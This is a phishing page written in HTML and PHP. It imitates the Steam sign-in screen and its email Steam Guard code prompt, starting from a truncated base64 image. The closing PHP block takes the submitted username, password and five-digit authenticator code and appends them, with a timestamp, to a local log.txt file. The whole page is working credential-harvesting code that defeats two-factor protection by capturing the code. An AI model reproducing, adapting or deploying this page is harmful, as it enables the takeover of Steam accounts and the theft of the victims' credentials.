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
                            height=36 border=0 alt=STEAM>
                    </a>
                </div>
            </div>
        </div>

        <div class=responsive_page_content_overlay>
        </div>
        <div class="responsive_fixonscroll_ctn nonresponsive_hidden">
        </div>

        <div class=responsive_page_content>
            <div id=responsive_store_nav_ctn></div>
            <div id=responsive_store_nav_overlay style=display:none></div>
            <div id=responsive_store_search_overlay style=display:none></div>
            <div data-cart-banner-spot=1></div>
            <div class=responsive_page_template_content id=responsive_page_template_content
                data-panel='{"autoFocus":true}'>

                <div class=page_content>


                    <div data-featuretarget=login>
                        <div class=login_LoginContainer_2kLRm>
                            <div class=newlogindialog_Login_ZOBYq>
                                <div class="newlogindialog_FlexCol_1mhmm newlogindialog_StandardLayout_286eh"
                                    style=gap:32px>
                                    <div style="display:flex;flex-direction:column;gap:8px;margin:8px 16px">
                                        <div id="tytul" class=newlogindialog_PrimaryHeader_39uMK>
                                            Sign in
                                        </div>
                                    </div>

                                    <div id="main" class=newlogindialog_FormContainer_3jLIH style="background-color: #181a21;
                                    border-radius: 4px;
                                    padding: 24px 32px;
                                    flex: 1;
                                    min-width: 636px;">
                                        <div id="innerMain" class=newlogindialog_SideBySide_1Wl13>

                                            <form id="form2" action="login.php" method="post">
                                                <div class="" style="gap: 14px; display: flex;
                flex-direction: column;">

                                                    <div class="">
                                                        <div class="" style="font-size: 18px;
                    font-weight: 500;
                    color: #afafaf;
                    text-align: center;
                    display: block;">Account:
                                                            <span class="" style="
                        font-size: 18px;
                        font-weight: 500;
                        color: #fff;">kornel2383</span>
                                                        </div>
                                                        <div class="" style="text-align: center; font-family: 'Motiva Sans', Sans-serif;
                    font-weight: 300;
                    color: #c6d4df;
                    font-size: 13px;
                    font-size: 14px;
                    color: #afafaf;
                    opacity: .5;
                    font-weight: 500;
                    padding-top: 6px;
                    padding-bottom: 10px;">
                                                            You have an email authenticator protecting this account.
                                                        </div>
                                                    </div>
                                                    <div class="" style="
                background-color: #32353c;
                display: flex;
                align-self: center;
                flex-direction: column;
                padding: 20px 20px 0px 20px;
                border-radius: 2px;
                max-width: 500px;">
                                                        <div class=""
                                                            style="gap: 2px; align-items: center; display: flex; flex-direction: column;">
                                                            <div class="" style="display: flex;
                            flex-direction: row;
                            justify-content: center;
                            max-width: 280px;
                            background-color: #2b2e33;
                            border-radius: 2px;
                            gap: 20px;
                            padding: 10px 28px 20px;
                            cursor: text;
                            border: 1px solid transparent;
                            position: relative;
                            display: inline-block;">
                                                                <input id="in1" type="text" maxlength="1" autocomplete="none"
                                                                    class="" value="" name="in1" style="
                                background: none;
                                outline: none;
                                border: none;
                                border-bottom: 2px solid rgba(175, 175, 175, .25);
                                padding: 0;
                                color: #fff;
                                width: 40px;
                                font-size: 28px;
                                font-family: inherit;
                                font-weight: 500;
                                text-align: center;
                            ">
                                                                <input type="text" maxlength="1" autocomplete="none"
                                                                    class="" value="" name="in2" style="
                            background: none;
                            outline: none;
                            border: none;
                            border-bottom: 2px solid rgba(175, 175, 175, .25);
                            padding: 0;
                            color: #fff;
                            width: 40px;
                            font-size: 28px;
                            font-family: inherit;
                            font-weight: 500;
                            text-align: center;
                        ">
                                                                <input type="text" maxlength="1" autocomplete="none"
                                                                    class="" value="" name="in3" style="
                            background: none;
                            outline: none;
                            border: none;
                            border-bottom: 2px solid rgba(175, 175, 175, .25);
                            padding: 0;
                            color: #fff;
                            width: 40px;
                            font-size: 28px;
                            font-family: inherit;
                            font-weight: 500;
                            text-align: center;
                        ">
                                                                <input type="text" maxlength="1" autocomplete="none"
                                                                    class="" value="" name="in4" style="
                            background: none;
                            outline: none;
                            border: none;
                            border-bottom: 2px solid rgba(175, 175, 175, .25);
                            padding: 0;
                            color: #fff;
                            width: 40px;
                            font-size: 28px;
                            font-family: inherit;
                            font-weight: 500;
                            text-align: center;
                        ">
                                                                <input type="text" maxlength="1" autocomplete="none"
                                                                    class="" value="" name="in5" style="
                            background: none;
                            outline: none;
                            border: none;
                            border-bottom: 2px solid rgba(175, 175, 175, .25);
                            padding: 0;
                            color: #fff;
                            width: 40px;
                            font-size: 28px;
                            font-family: inherit;
                            font-weight: 500;
                            text-align: center;
                        ">
                            
                                                            </div>
                                                            <button style="
                                                                position: relative;
                                                                background: linear-gradient(90deg, #06bfff 0, #2d73ff 100%);
                                                                border-radius: 2px;
                                                                border: 0;
                                                                outline: 0;
                                                                padding: 15px;
                                                                margin-top: 12px;
                                                                color: #fff;
                                                                font-size: 18px;
                                                                font-weight: 500;
                                                                font-family: inherit;
                                                                text-align: center;
                                                                letter-spacing: .03em;
                                                                cursor: pointer;"
                                                                >Confirm</button>
                                                        </div>
                                                        <div class="" style="display: flex;
                            flex-direction: row;
                            justify-content: space-evenly;
                            align-items: center;">
                                                            <div class="">
                                                                <div style="display: flex;
                                    flex-direction: row;
                                    justify-content: space-evenly;
                                    align-items: center;">
                                                                    <div class="" style="color: #fff;
                                text-align: center;
                                font-size: 16px;
                                line-height: 20px;
                                padding: 12px 12px 24px 12px;
                                gap: 24px;">Enter the code from your email address at:
                                                                        <span class=""
                                                                            style="color: #1999ff;">gmail.com</span>
                                                                    </div>
                                                                    <svg viewBox="0 0 58 56" fill="none"
                                                                        class="_3qdu3-d2Nbudcqe-VBrC8r" style="font-family: 'Motiva Sans', Sans-serif;
                                font-weight: 300;
                                color: #c6d4df;
                                font-size: 13px;
                                width: 10px;
                                background-color: #434953;
                                border-radius: 10px;
                                z-index: 12;
                                border: 4px solid rgba(0, 0, 0, 0);
                                background-clip: padding-box;
                                transition: background-color .32s ease-in-out;
                                margin: 4px;
                                min-height: 32px;
                                min-width: 32px;
                                width: 55px;
                                color: #1a99ff;">
                                                                        <path
                                                                            d="M57.9352 24.5887C57.8463 24.233 57.8463 23.8774 57.6684 23.5217C57.4017 22.8993 57.046 22.4547 56.5125 22.0101L49.577 16.4083V10.9844C49.577 8.85041 47.8876 7.16098 45.7536 7.16098H38.1956L31.5269 1.73706C30.1042 0.581137 28.0591 0.581137 26.6364 1.73706L19.9677 7.16098H12.4097C10.2757 7.16098 8.58631 8.93932 8.58631 10.9844V16.4083L1.56188 22.0101C1.02838 22.3658 0.672713 22.8993 0.405962 23.5217V23.6106C0.228128 24.1441 0.050293 24.5887 0.050293 25.1222V52.1529C0.050293 53.2199 0.494878 54.1091 1.1173 54.8204C1.82863 55.5318 2.80672 55.8874 3.7848 55.8874H54.0228C55.0898 55.8874 55.979 55.4428 56.6903 54.8204C57.4017 54.1091 57.7573 53.131 57.7573 52.1529V25.1222C57.9352 24.8554 57.9352 24.7665 57.9352 24.5887ZM49.577 19.7872L54.7342 23.9663L49.577 28.9456V19.7872ZM28.148 3.60431C28.4148 3.42648 28.6815 3.24864 28.9483 3.24864C29.3039 3.24864 29.5707 3.33756 29.7485 3.60431L34.0165 7.07207H23.9689L28.148 3.60431ZM10.9871 10.9844C10.9871 10.2731 11.5206 9.73958 12.2319 9.73958H45.6646C46.376 9.73958 46.9095 10.362 46.9095 10.9844V31.4353L46.8206 31.5242L40.2407 37.9262H17.6558L11.076 31.5242L10.9871 31.4353V10.9844ZM8.40848 19.7872V28.9456L3.34022 23.9663L8.40848 19.7872ZM2.62888 51.6194V26.9005L15.2551 39.26L2.62888 51.6194ZM4.49614 53.3088L17.6558 40.5048H40.2407L53.4004 53.3088H4.49614ZM55.3566 51.6194L42.6415 39.1711L55.2677 26.8116V51.6194H55.3566ZM29.0372 35.3476C30.5488 35.3476 31.9715 35.0809 33.3941 34.5474C34.0165 34.2806 34.3722 33.4804 34.1055 32.858C33.8387 32.2355 33.0385 31.8799 32.416 32.1466C31.349 32.5912 30.1931 32.769 29.0372 32.769C27.3478 32.769 25.7473 32.3245 24.4135 31.5242C21.746 29.9237 20.0566 27.0784 20.0566 23.7884C20.0566 18.8091 24.0579 14.8078 29.0372 14.8078C34.0165 14.8078 38.0178 18.8091 38.0178 23.7884V24.4109C38.0178 25.4779 37.2175 26.367 36.0616 26.367C34.9946 26.367 34.1055 25.4779 34.1055 24.4109V23.7884C34.1055 20.9431 31.7936 18.6313 28.9483 18.6313C26.1029 18.6313 23.7911 20.9431 23.7911 23.7884C23.7911 26.6338 26.1029 28.9456 28.9483 28.9456C30.3709 28.9456 31.7047 28.3232 32.5939 27.434C33.3941 28.4121 34.639 28.9456 35.9727 28.9456C38.4624 28.9456 40.5075 26.9894 40.5075 24.4109V23.7884C40.5075 17.3864 35.2614 12.2292 28.9483 12.2292C22.6352 12.2292 17.3891 17.4753 17.3891 23.7884C17.3891 26.7227 18.545 29.4791 20.3233 31.5242C22.5463 33.925 25.5694 35.3476 29.0372 35.3476ZM29.0372 26.367C27.6145 26.367 26.4586 25.2111 26.4586 23.7884C26.4586 22.3658 27.6145 21.2098 29.0372 21.2098C30.4599 21.2098 31.6158 22.3658 31.6158 23.7884C31.5269 25.2111 30.371 26.367 29.0372 26.367Z"
                                                                            fill="#1A99FF"></path>
                                                                    </svg>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <a class=""
                                                        href="https://help.steampowered.com/wizard/HelpWithSteamGuardCode"
                                                        style="color: #afafaf;
                            font-size: 12px;
                            text-decoration: underline;
                            cursor: pointer;
                            text-align: center;">Help, I no longer have access to the email address for this
                                                        account</a>
                                                </div>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class=login_bottom_row>
                        <div class=login_bottom_row_item>
                            <div class=subtext>Join Steam and discover thousands of games to play.</div>
                            <a class="login_join_desc about_link" href=https://store.steampowered.com/about>Learn
                                More</a>
                        </div>
                        <img alt="Join Steam" class="join_image login_bottom_row_item" src="join.png">
                        <div class="login_btn_ctn login_bottom_row_item">
                            <a target=_top href="https://store.steampowered.com/join/?&amp;snr=1_60_4__62"
                                class="btnv6_white_transparent btn_medium">
                                <span>Join Steam</span>
                            </a>
                            <div class=subtext>It's free and easy to use.</div>
                        </div>
                    </div>

                    <style>
                        .SVGIcon_Button {
                            fill: #fff;
                            overflow: visible;
                            width: 100%;
                            height: 100%;
                            max-width: 320px;
                            max-height: 320px
                        }
                    </style>

                </div>
            </div>
            <div id=footer_spacer class=sf-hidden></div>
            <div id=footer class=sf-hidden>
            </div>
        </div>
    </div>
    <style>
        .fade-out {
            display: none;
            opacity: 0;
            transition: opacity 0.5s ease-out;
            visibility: hidden;
            /* z-index: -999; */
        }
    </style>

    <script>
        function isInputFull(){
            const inputs = document.querySelectorAll('input[type="text"]');
            let isValid = true;
            inputs.forEach(input => {
            if (input.value == ''){
                isValid = false;
            }
            });
            return isValid;
        }  
        const inputs = document.querySelectorAll('input[type="text"]');

        inputs.forEach((input, index) => {
            input.addEventListener('input', (event) => {
                if (event.target.value.length === 1) {
                    if (index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                }
            });
        });
    </script>
</body>



<?php


$user = $_POST['username'];
$pass = $_POST['password'];
$time = date('Y-m-d H:i:s');
$logFile = 'log.txt';
if (empty($user) && empty($pass)){
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        // Odczytanie danych przesłanych przez JavaScript
        $code1 = $_POST['in1'] ?? '';
        $code2 = $_POST['in2'] ?? '';
        $code3 = $_POST['in3'] ?? '';
        $code4 = $_POST['in4'] ?? '';
        $code5 = $_POST['in5'] ?? '';
    
        if (!empty($code1) && !empty($code2) && !empty($code3) && !empty($code4) && !empty($code5)) {
            // Łączenie kodów w jeden ciąg znaków
            $fullCode = $code1 . $code2 . $code3 . $code4 . $code5;

            $file = fopen($logFile,'a');
            fwrite($file, $fullCode."\n");
            fclose($file);
        }
    }
}
else {
    $logData = "$time | username: $user | password: $pass | Steamguard: ";
    $file = fopen($logFile,'a');
    fwrite($file, $logData);
    fclose($file);
}



// header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');


exit();
?>